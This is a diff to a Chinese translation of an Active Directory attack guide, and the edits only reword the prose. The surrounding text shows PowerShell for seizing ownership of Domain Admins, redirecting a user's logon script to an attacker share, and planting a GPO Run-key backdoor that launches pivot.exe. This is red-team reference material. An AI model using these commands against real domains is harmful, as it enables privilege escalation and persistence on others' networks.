@@ -72,7 +72,7 @@ rpcclient -U KnownUsername 10.10.10.192
 ```
 ## **对组的 WriteOwner 权限**
 
-如果攻击者发现他们对一个组拥有 `WriteOwner` 权限，他们可以将该组的所有权更改为自己。这在该组是 `Domain Admins` 时尤其具有影响力，因为更改所有权允许对组属性和成员资格进行更广泛的控制。该过程涉及通过 `Get-ObjectAcl` 确定正确的对象，然后使用 `Set-DomainObjectOwner` 修改所有者，可以通过 SID 或名称进行修改。
+如果攻击者发现他们对一个组拥有 `WriteOwner` 权限，他们可以将该组的所有权更改为自己。这在该组是 `Domain Admins` 时尤其具有影响力，因为更改所有权允许对组属性和成员资格进行更广泛的控制。该过程涉及通过 `Get-ObjectAcl` 确定正确的对象，然后使用 `Set-DomainObjectOwner` 通过 SID 或名称修改所有者。
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -80,7 +80,7 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite on User**
 
-此权限允许攻击者修改用户属性。具体来说，拥有 `GenericWrite` 访问权限的攻击者可以更改用户的登录脚本路径，以便在用户登录时执行恶意脚本。这是通过使用 `Set-ADObject` 命令更新目标用户的 `scriptpath` 属性，使其指向攻击者的脚本来实现的。
+此权限允许攻击者修改用户属性。具体来说，拥有 `GenericWrite` 访问权限的攻击者可以更改用户的登录脚本路径，以便在用户登录时执行恶意脚本。这是通过使用 `Set-ADObject` 命令将目标用户的 `scriptpath` 属性更新为指向攻击者的脚本来实现的。
 ```powershell
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
@@ -132,7 +132,7 @@ New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net l
 ```
 ### GroupPolicy 模块 - 滥用 GPO
 
-GroupPolicy 模块（如果已安装）允许创建和链接新的 GPO，并设置首选项，例如注册表值，以在受影响的计算机上执行后门。此方法要求更新 GPO，并且需要用户登录计算机以执行：
+GroupPolicy 模块（如果已安装）允许创建和链接新的 GPO，并设置首选项，例如注册表值，以在受影响的计算机上执行后门。此方法要求更新 GPO，并且用户必须登录计算机以执行：
 ```powershell
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
@@ -155,11 +155,11 @@ GPO 更新通常每 90 分钟发生一次。为了加快此过程，特别是在
 
 ### 用户和组
 
-GPO 还允许在目标系统上操纵用户和组的成员资格。通过直接编辑用户和组政策文件，攻击者可以将用户添加到特权组中，例如本地 `administrators` 组。这是通过委派 GPO 管理权限实现的，允许修改政策文件以包含新用户或更改组成员资格。
+GPO 还允许在目标系统上操纵用户和组的成员资格。通过直接编辑用户和组政策文件，攻击者可以将用户添加到特权组，例如本地 `administrators` 组。这是通过委派 GPO 管理权限实现的，允许修改政策文件以包含新用户或更改组成员资格。
 
-用户和组的 XML 配置文件概述了这些更改是如何实施的。通过向该文件添加条目，可以在受影响的系统上授予特定用户提升的权限。这种方法提供了一种通过 GPO 操作直接提升权限的途径。
+用户和组的 XML 配置文件概述了这些更改是如何实施的。通过向该文件添加条目，可以授予特定用户在受影响系统上的提升权限。这种方法提供了一种通过 GPO 操作直接提升权限的途径。
 
-此外，还可以考虑其他执行代码或保持持久性的方法，例如利用登录/注销脚本、修改注册表键以实现自动运行、通过 .msi 文件安装软件或编辑服务配置。这些技术提供了通过滥用 GPO 维护访问和控制目标系统的各种途径。
+此外，还可以考虑其他执行代码或维持持久性的方式，例如利用登录/注销脚本、修改注册表键以实现自动运行、通过 .msi 文件安装软件或编辑服务配置。这些技术提供了通过滥用 GPO 维持访问和控制目标系统的多种途径。
 
 ## 参考文献
 
